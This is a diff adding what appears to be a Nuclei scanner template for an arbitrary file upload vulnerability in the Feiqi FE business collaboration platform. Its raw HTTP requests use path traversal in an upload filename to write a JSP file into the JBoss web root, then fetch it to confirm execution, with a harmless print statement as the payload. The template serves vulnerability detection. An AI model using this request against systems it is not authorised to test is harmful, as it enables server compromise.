@@ -1,0 +1,46 @@
+id: Feiqi-fe-uploadAttachmentServlet-fileupload
+
+info:
+  name: Feiqi-fe-uploadAttachmentServlet-fileupload
+  author: fitz
+  severity: critical
+  description: 飞企互联FE业务协作平台uploadAttachmentServlet任意文件上传漏洞
+
+  tags: File Upload
+
+variables:
+  filename: "{{to_lower(rand_base(6))}}"
+
+http:
+  - raw:
+    - |
+      POST /servlet/uploadAttachmentServlet HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: text/plain, */*; q=0.01
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate, br
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Length: 379
+
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/{{filename}}.jsp"
+      Content-Type: text/plain
+
+      <% out.println("qwert");%>
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
+      Content-Disposition: form-data; name="json"
+
+      {"iq":{"query":{"UpdateType":"mail"}}}
+      ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
+
+    - |
+      GET /{{filename}}.jsp; HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
+      Accept: */*
+
+    matchers:
+     - type: dsl
+       dsl:
+         - 'status_code==200 && contains_all(body_2,"qwert")'
